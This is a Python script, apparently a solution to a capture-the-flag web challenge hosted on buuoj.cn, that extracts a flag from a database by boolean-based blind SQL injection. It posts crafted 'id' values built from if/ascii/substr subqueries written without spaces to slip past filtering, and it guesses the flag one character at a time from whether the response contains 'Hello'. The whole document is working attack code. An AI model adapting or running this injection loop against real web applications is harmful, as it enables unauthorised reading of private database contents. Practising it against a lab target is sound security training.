import requests

URL = "http://112fbb52-f3b5-4e28-a8c8-2db629fbdf49.node4.buuoj.cn:81/index.php"
HEADERS = {
    "Host": "112fbb52-f3b5-4e28-a8c8-2db629fbdf49.node4.buuoj.cn:81",
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/119.0",
    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
    "Accept-Language": "zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2",
    "Accept-Encoding": "gzip, deflate, br",
    "Content-Type": "application/x-www-form-urlencoded",
    "Content-Length": "4",
    "Origin": "http://112fbb52-f3b5-4e28-a8c8-2db629fbdf49.node4.buuoj.cn:81",
    "Connection": "close",
    "Referer": "http://112fbb52-f3b5-4e28-a8c8-2db629fbdf49.node4.buuoj.cn:81/",
    "Upgrade-Insecure-Requests": "1"
}


def structurePayload(*args):
    return {"id": f"if(ascii(substr((select(flag)from(flag)),{args[0]},1))='{ord(args[1])}',1,2)"}


flag = ""
for i in range(0, 50):
    n = 0
    for symbol in '-{abcdefghijklmnopqrstuvwxyz0123456789}':
        data = structurePayload(i, symbol)
        res = requests.post(URL, data=data, headers=HEADERS)
        s = res.text
        if res.status_code == 200:
            if "Hello" in s:
                n = 1
                flag += symbol
                if symbol == '}':
                    print(flag)
                    exit()
                break
            elif "SQL" in s:
                n = 2
                flag += '&'
                continue
        else:
            flag += '#'
            continue
    if n == 0:
        flag += '*'
    print(flag)


